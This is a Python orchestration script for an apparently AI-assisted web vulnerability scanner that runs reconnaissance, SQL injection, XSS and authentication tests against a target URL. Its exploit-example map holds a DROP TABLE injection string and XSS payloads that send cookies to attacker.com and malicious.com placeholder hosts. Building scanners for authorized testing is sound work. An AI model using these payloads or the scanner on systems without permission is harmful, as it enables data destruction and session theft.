#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import time
import datetime
import requests
import threading
import argparse
import subprocess
import random
from urllib.parse import urlparse

# Import all available security testing modules
try:
    from comprehensive_tester import ComprehensiveTester
    from injection_attacks import InjectionAttacker
    from xss_attacks import XSSAttacker
    from auth_attacks import AuthAttacker
    from vulnerability_scanner import VulnerabilityScanner
    from osint_tools import OSINTScanner
    from network_tools import NetworkTools
    from social_engineering import SocialEngineeringTester
    from security_framework import SecurityFramework
    from ai_security_integrator import AISecurityIntegrator
except ImportError as e:
    print(f"Warning: Some modules couldn't be imported: {e}")
    print("Only core functionality will be available")

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ai_vulnerability_scanning.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AIVulnerabilityScanner")

class AIVulnerabilityScanner:
    """
    AI-powered Comprehensive Vulnerability Scanner
    
    This system orchestrates a multi-layered approach to vulnerability scanning:
    1. Receives a website URL for vulnerability testing
    2. Coordinates detailed analysis using multiple tools and AI
    3. Analyzes vulnerability conditions and triggers
    4. Investigates potential exploitation paths and impacts
    5. Generates detailed reports on findings, exploitation methods, and remediation
    """
    
    def __init__(self, target_url, output_dir="ai_vulnerability_reports", scan_id=None):
        self.target_url = self._validate_url(target_url)
        self.output_dir = output_dir
        self.scan_id = scan_id or str(int(time.time()))
        self.timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.report_dir = os.path.join(output_dir, f"scan_{self.scan_id}_{self.timestamp}")
        
        # Ensure report directory exists
        os.makedirs(self.report_dir, exist_ok=True)
        
        # Status tracking
        self.status = "Initialized"
        self.progress = 0
        self.scan_logs = []
        
        # Results structure
        self.results = {
            "scan_id": self.scan_id,
            "timestamp": self.timestamp,
            "target": target_url,
            "status": "Initialized",
            "progress": 0,
            "system_info": {
                "web_server": "Unknown",
                "technologies": [],
                "frameworks": [],
                "operating_system": "Unknown",
                "ip_address": "Unknown"
            },
            "vulnerabilities": [],
            "vulnerable_components": [],  # Added field for vulnerable components
            "exploitation_paths": {},
            "remediation": {},
            "tools_output": {}
        }
        
        # Initialize the AI security integrator if available
        self.ai_integrator = None
        if 'AISecurityIntegrator' in globals():
            try:
                self.ai_integrator = AISecurityIntegrator(self.target_url, self.report_dir)
                logger.info("AI Security Integrator initialized successfully")
            except Exception as e:
                logger.error(f"Error initializing AI Security Integrator: {str(e)}")
        
        logger.info(f"Initialized AIVulnerabilityScanner for target: {target_url}")
        self.log_progress("Scanner initialized")
    
    def _validate_url(self, url):
        """Validate and normalize the target URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    def log_progress(self, message):
        """Log progress and update status"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        self.scan_logs.append(log_entry)
        self.status = message
        logger.info(message)
    
    def update_progress(self, value, message=None):
        """Update progress percentage"""
        self.progress = value
        if message:
            self.log_progress(message)
        
        # Update results
        self.results["status"] = self.status
        self.results["progress"] = self.progress
    
    def run_comprehensive_testing(self):
        """Run comprehensive security testing using the ComprehensiveTester module"""
        self.log_progress("Starting comprehensive security testing")
        
        try:
            tester = ComprehensiveTester(self.target_url, self.report_dir, self.scan_id)
            
            # Run passive reconnaissance
            self.update_progress(5, "Running passive reconnaissance...")
            passive_results = tester.run_passive_reconnaissance()
            
            # Run active reconnaissance
            self.update_progress(15, "Running active reconnaissance...")
            active_results = tester.run_active_reconnaissance()
            
            # Analyze infrastructure
            self.update_progress(25, "Analyzing infrastructure...")
            infrastructure_results = tester.analyze_infrastructure()
            
            # Analyze tech stack
            self.update_progress(35, "Analyzing technology stack...")
            tech_stack_results = tester.analyze_tech_stack()
            
            # Save the results from comprehensive testing
            self.results["tools_output"]["comprehensive_testing"] = {
                "passive_recon": passive_results,
                "active_recon": active_results,
                "infrastructure": infrastructure_results,
                "tech_stack": tech_stack_results
            }
            
            # Extract system information
            self._extract_system_info(tech_stack_results, infrastructure_results)
            
            # Save comprehensive test results
            tester.save_results()
            self.log_progress("Comprehensive testing completed")
            
            return True
        except Exception as e:
            logger.error(f"Error during comprehensive testing: {str(e)}")
            self.log_progress(f"Comprehensive testing error: {str(e)}")
            return False
    
    def _extract_system_info(self, tech_stack_results, infrastructure_results):
        """Extract and consolidate system information from test results"""
        try:
            # Extract web server info
            if "versions" in tech_stack_results and "server" in tech_stack_results["versions"]:
                self.results["system_info"]["web_server"] = tech_stack_results["versions"]["server"]
            
            # Extract technologies
            technologies = []
            if "versions" in tech_stack_results:
                for software, version in tech_stack_results["versions"].items():
                    if software != "other_cms" and version:
                        technologies.append(f"{software} {version}")
            
            if "libraries" in tech_stack_results:
                if "javascript" in tech_stack_results["libraries"]:
                    for lib in tech_stack_results["libraries"]["javascript"]:
                        technologies.append(lib.get("name", "Unknown JS Library"))
                
                if "css" in tech_stack_results["libraries"]:
                    for lib in tech_stack_results["libraries"]["css"]:
                        technologies.append(lib.get("name", "Unknown CSS Library"))
            
            self.results["system_info"]["technologies"] = technologies
            
            # Extract frameworks
            if "frameworks" in tech_stack_results:
                self.results["system_info"]["frameworks"] = tech_stack_results["frameworks"]
            
            # Extract operating system (guessed from web server info)
            if "web_server" in self.results["system_info"]:
                server = self.results["system_info"]["web_server"].lower()
                if "windows" in server:
                    self.results["system_info"]["operating_system"] = "Windows"
                elif "ubuntu" in server or "debian" in server:
                    self.results["system_info"]["operating_system"] = "Linux (Ubuntu/Debian)"
                elif "centos" in server or "rhel" in server or "fedora" in server:
                    self.results["system_info"]["operating_system"] = "Linux (CentOS/RHEL/Fedora)"
                elif "nginx" in server:
                    self.results["system_info"]["operating_system"] = "Likely Linux"
                elif "apache" in server:
                    self.results["system_info"]["operating_system"] = "Unknown (Apache runs on multiple OSes)"
            
            # Extract IP address
            if "load_balancer" in infrastructure_results and "unique_ips" in infrastructure_results["load_balancer"]:
                if infrastructure_results["load_balancer"]["unique_ips"]:
                    self.results["system_info"]["ip_address"] = infrastructure_results["load_balancer"]["unique_ips"][0]
        
        except Exception as e:
            logger.error(f"Error extracting system info: {str(e)}")
    
    def run_specialized_tests(self):
        """Run specialized vulnerability tests using available modules"""
        self.log_progress("Starting specialized vulnerability testing")
        
        # Track vulnerabilities found
        vulnerabilities = []
        
        # Test for SQL injection vulnerabilities
        self.update_progress(40, "Testing for SQL injection vulnerabilities...")
        if 'InjectionAttacker' in globals():
            try:
                injection_attacker = InjectionAttacker(self.target_url, self.report_dir)
                sql_results = injection_attacker.run_sql_injection_tests()
                
                # Add results to overall findings
                self.results["tools_output"]["sql_injection"] = sql_results
                
                # Add vulnerabilities to the main list
                if "vulnerabilities" in sql_results:
                    for vuln in sql_results["vulnerabilities"]:
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "Critical",
                            "details": f"{vuln['type']} found in {vuln['param']} parameter",
                            "parameter": vuln["param"],
                            "payload": vuln.get("payload", ""),
                            "exploitation_steps": f"1. Access {vuln['url']}\n2. Submit payload in the {vuln['param']} parameter\n3. Database executes the injected SQL command"
                        })
                
                injection_attacker.save_results()
                self.log_progress("SQL injection testing completed")
            except Exception as e:
                logger.error(f"Error during SQL injection testing: {str(e)}")
        
        # Test for XSS vulnerabilities
        self.update_progress(50, "Testing for Cross-Site Scripting vulnerabilities...")
        if 'XSSAttacker' in globals():
            try:
                xss_attacker = XSSAttacker(self.target_url, self.report_dir)
                xss_results = xss_attacker.run_all_tests()
                
                # Add results to overall findings
                self.results["tools_output"]["xss"] = xss_results
                
                # Process each type of XSS vulnerability
                for xss_type in ["reflected_xss", "stored_xss", "dom_xss"]:
                    if xss_type in xss_results and "vulnerabilities" in xss_results[xss_type]:
                        for vuln in xss_results[xss_type]["vulnerabilities"]:
                            vulnerabilities.append({
                                "type": "XSS",
                                "subtype": xss_type.replace("_", " ").title(),
                                "severity": "High",
                                "details": f"{vuln['type']} found in {vuln.get('param', 'unknown')} parameter",
                                "parameter": vuln.get("param", "unknown"),
                                "payload": vuln.get("payload", ""),
                                "exploitation_steps": f"1. Access {vuln['url']}\n2. Submit payload in the vulnerable parameter\n3. JavaScript executes in victim's browser"
                            })
                
                xss_attacker.save_results()
                self.log_progress("XSS testing completed")
            except Exception as e:
                logger.error(f"Error during XSS testing: {str(e)}")
        
        # Test for authentication vulnerabilities
        self.update_progress(60, "Testing for authentication vulnerabilities...")
        if 'AuthAttacker' in globals():
            try:
                auth_attacker = AuthAttacker(self.target_url, self.report_dir)
                auth_results = auth_attacker.run_all_tests()
                
                # Add results to overall findings
                self.results["tools_output"]["auth"] = auth_results
                
                # Add vulnerabilities to the main list
                if "vulnerabilities" in auth_results:
                    for vuln in auth_results["vulnerabilities"]:
                        vulnerabilities.append({
                            "type": "Authentication",
                            "severity": vuln.get("severity", "Medium"),
                            "details": vuln.get("details", "Authentication vulnerability found"),
                            "vulnerability": vuln.get("vulnerability", "Unknown"),
                            "exploitation_steps": vuln.get("exploitation_steps", "No specific exploitation steps provided")
                        })
                
                auth_attacker.save_results()
                self.log_progress("Authentication testing completed")
            except Exception as e:
                logger.error(f"Error during authentication testing: {str(e)}")
        
        # Update the vulnerabilities list
        self.results["vulnerabilities"].extend(vulnerabilities)
        
        # Identify vulnerable components
        self.identify_vulnerable_components()
        
        self.update_progress(70, "Specialized vulnerability testing completed")
        return len(vulnerabilities) > 0
    
    def identify_vulnerable_components(self):
        """Identify vulnerable components and describe their exploitation methods"""
        self.log_progress("Identifying vulnerable components and describing exploits")
        
        # Create a map of vulnerability types to common vulnerable components and exploit patterns
        vulnerability_components_map = {
            "SQL Injection": {
                "affected_components": ["database queries", "login forms", "search functionality", "data filters"],
                "exploit_description": "An attacker can inject malicious SQL code into application queries, allowing them to bypass authentication, access unauthorized data, modify database contents, or execute commands on the database server.",
                "exploit_examples": [
                    "' OR 1=1 --",
                    "admin'; DROP TABLE users; --",
                    "1 UNION SELECT username, password FROM users --"
                ]
            },
            "XSS": {
                "affected_components": ["input fields", "comment forms", "search results", "user profiles"],
                "exploit_description": "An attacker can inject malicious JavaScript code that executes in victims' browsers, allowing cookie theft, session hijacking, phishing attacks, or browser-based exploits.",
                "exploit_examples": [
                    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                    "<img src=\"x\" onerror=\"alert(document.cookie)\">",
                    "<div onmouseover=\"location='https://malicious.com/'+document.cookie\">"
                ]
            },
            "Authentication": {
                "affected_components": ["login functionality", "password reset", "session management", "registration forms"],
                "exploit_description": "Authentication vulnerabilities can be exploited to bypass login requirements, take over accounts, or gain unauthorized access to protected resources and functionality.",
                "exploit_examples": [
                    "Manipulating user IDs in cookies or hidden form fields",
                    "Brute forcing weak credentials",
                    "Exploiting predictable password reset tokens"
                ]
            }
        }
        
        # Clear previous vulnerable components data
        self.results["vulnerable_components"] = []
        
        # Process each vulnerability to identify affected components
        for vulnerability in self.results["vulnerabilities"]:
            vuln_type = vulnerability.get("type", "")
            if vuln_type not in vulnerability_components_map:
                continue
                
            # Get component mapping
            component_info = vulnerability_components_map[vuln_type]
            
            # Get details about the affected parameter
            affected_param = vulnerability.get("parameter", "unknown")
            severity = vulnerability.get("severity", "Medium")
            
            # Determine exploit example (choose randomly if multiple examples available)
            exploit_example = random.choice(component_info["exploit_examples"]) if component_info["exploit_examples"] else "No example available"
            
            # Create vulnerable component entry
            component_name = f"{affected_param} parameter in {vuln_type.lower()} context"
            if vuln_type == "XSS" and "subtype" in vulnerability:
                component_name = f"{affected_param} parameter ({vulnerability['subtype']} context)"
            
            vulnerable_component = {
                "vulnerability_type": vuln_type,
                "component_name": component_name,
                "affected_components": component_info["affected_components"],
                "severity": severity,
                "exploit_description": component_info["exploit_description"],
                "exploit_example": exploit_example,
                "remediation_steps": [
                    f"Validate all input from the {affected_param} parameter",
                    "Implement context-appropriate escaping/encoding",
                    "Add appropriate security headers and protections",
                    "Consider using secure frameworks and libraries"
                ]
            }
            
            self.results["vulnerable_components"].append(vulnerable_component)
            
        logger.info(f"Identified {len(self.results['vulnerable_components'])} vulnerable components")
        return self.results["vulnerable_components"]
    
    def analyze_vulnerabilities_with_ai(self):
        """Use AI to analyze vulnerabilities, their conditions, and potential impacts"""
        if not self.ai_integrator:
            self.log_progress("AI Security Integrator not available, skipping AI analysis")
            return False
        
        self.log_progress("Starting AI-powered vulnerability analysis")
        
        try:
            # Analyze current findings with AI
            self.update_progress(80, "AI is analyzing vulnerabilities...")
            ai_analysis = self.ai_integrator.analyze_vulnerabilities(self.results["vulnerabilities"])
            
            # Add AI-enhanced exploitation paths
            self.update_progress(85, "AI is determining exploitation paths...")
            exploitation_paths = self.ai_integrator.determine_exploitation_paths(self.results["vulnerabilities"])
            
            # Add AI-generated recommendations
            self.update_progress(90, "AI is generating remediation recommendations...")
            remediation = self.ai_integrator.generate_remediation_recommendations(self.results["vulnerabilities"])
            
            # Enhance vulnerable components with AI
            self.update_progress(92, "AI is enhancing vulnerable component analysis...")
            if hasattr(self.ai_integrator, 'enhance_vulnerable_components'):
                self.results["vulnerable_components"] = self.ai_integrator.enhance_vulnerable_components(
                    self.results["vulnerable_components"],
                    self.results["vulnerabilities"]
                )
            
            # Update results with AI analysis
            self.results["ai_analysis"] = ai_analysis
            self.results["exploitation_paths"] = exploitation_paths
            self.results["remediation"] = remediation
            
            self.update_progress(95, "AI vulnerability analysis completed")
            return True
        except Exception as e:
            logger.error(f"Error during AI vulnerability analysis: {str(e)}")
            self.log_progress(f"AI analysis error: {str(e)}")
            return False
    
    def restart_server_after_update(self):
        """Restart the server after updating vulnerability data"""
        self.log_progress("Preparing to restart server after updating vulnerability data")
        
        try:
            # Check if we're running in a Flask/Django/Web environment
            if 'FLASK_APP' in os.environ or 'DJANGO_SETTINGS_MODULE' in os.environ:
                self.log_progress("Detected web framework environment")
                
                # Create a restart flag file to trigger restart on next check
                flag_path = os.path.join(self.output_dir, "restart_required.flag")
                with open(flag_path, "w") as f:
                    f.write(f"AI Scan restart triggered after scan {self.scan_id} at {datetime.datetime.now().isoformat()}")
                
                # Different restart methods based on the environment
                if sys.platform.startswith('win'):
                    # Windows restart approach
                    self.log_progress("Windows platform detected, attempting to restart service")
                    restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_server.bat")
                    if os.path.exists(restart_script_path):
                        subprocess.Popen(restart_script_path, shell=True)
                        self.log_progress("Server restart initiated via batch script")
                    else:
                        # Create a restart script
                        with open(restart_script_path, "w") as f:
                            f.write('@echo off\n')
                            f.write('echo Restarting server after AI vulnerability scan update\n')
                            f.write('timeout /t 5\n')
                            f.write('taskkill /f /im python.exe /fi "WINDOWTITLE eq VulnerabilityScanner"\n')
                            f.write('start "VulnerabilityScanner" python app.py\n')
                            f.write('echo Server restarted successfully\n')
                        subprocess.Popen(restart_script_path, shell=True)
                        self.log_progress("Created and executed restart script")
                else:
                    # Linux/Unix restart approach
                    self.log_progress("Unix-like platform detected, attempting to restart service")
                    restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_server.sh")
                    if os.path.exists(restart_script_path):
                        os.chmod(restart_script_path, 0o755)  # Make executable
                        subprocess.Popen(["/bin/bash", restart_script_path])
                        self.log_progress("Server restart initiated via shell script")
                    else:
                        # Create a restart script
                        with open(restart_script_path, "w") as f:
                            f.write('#!/bin/bash\n')
                            f.write('echo "Restarting server after AI vulnerability scan update"\n')
                            f.write('sleep 5\n')
                            f.write('pkill -f "python.*app.py"\n')
                            f.write('nohup python app.py > server.log 2>&1 &\n')
                            f.write('echo "Server restarted successfully"\n')
                        os.chmod(restart_script_path, 0o755)  # Make executable
                        subprocess.Popen(["/bin/bash", restart_script_path])
                        self.log_progress("Created and executed restart script")
                
                self.log_progress("Server restart has been triggered")
            else:
                self.log_progress("Not running in a web framework environment, restart not necessary")
        except Exception as e:
            logger.error(f"Error restarting server: {str(e)}")
            self.log_progress(f"Server restart error: {str(e)}")
            
        return True
    
    def generate_comprehensive_report(self):
        """Generate a comprehensive vulnerability report"""
        self.log_progress("Generating comprehensive vulnerability report")
        
        try:
            # Save the final results to JSON
            final_report_path = os.path.join(self.report_dir, "comprehensive_vulnerability_report.json")
            with open(final_report_path, 'w') as f:
                json.dump(self.results, f, indent=4)
            
            # Generate HTML report if possible
            if 'generate_report' in globals():
                html_report_path = os.path.join(self.report_dir, "vulnerability_report.html")
                generate_report(self.results, html_report_path)
            
            self.update_progress(100, "Comprehensive report generated successfully")
            return final_report_path
        except Exception as e:
            logger.error(f"Error generating comprehensive report: {str(e)}")
            self.log_progress(f"Report generation error: {str(e)}")
            return None
    
    def run_scan(self):
        """Run the complete vulnerability scanning process"""
        self.log_progress(f"Starting comprehensive vulnerability scan for {self.target_url}")
        
        try:
            # Step 1: Run comprehensive reconnaissance and testing
            self.run_comprehensive_testing()
            
            # Step 2: Run specialized vulnerability tests
            self.run_specialized_tests()
            
            # Step 3: Analyze vulnerabilities with AI
            self.analyze_vulnerabilities_with_ai()
            
            # Step 4: Generate comprehensive report
            report_path = self.generate_comprehensive_report()
            
            # Step 5: Restart server after updating data
            self.restart_server_after_update()
            
            self.log_progress(f"Scan completed. Report available at: {report_path}")
            return report_path
        except Exception as e:
            logger.error(f"Error during vulnerability scan: {str(e)}")
            self.log_progress(f"Scan failed: {str(e)}")
            self.update_progress(100, "Scan failed")
            return None

def start_scan(url, output_dir="ai_vulnerability_reports"):
    """Start a new vulnerability scan and return the scanner object"""
    scanner = AIVulnerabilityScanner(url, output_dir)
    
    # Start scan in a separate thread
    threading.Thread(target=scanner.run_scan).start()
    
    return scanner

def main():
    """Main function when running as script"""
    parser = argparse.ArgumentParser(description="AI-powered Comprehensive Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--output", "-o", default="ai_vulnerability_reports", help="Output directory for scan results")
    
    args = parser.parse_args()
    
    scanner = AIVulnerabilityScanner(args.target, args.output)
    scanner.run_scan()
    
    print(f"Scan completed. Results saved to {scanner.report_dir}/")

if __name__ == "__main__":
    main() 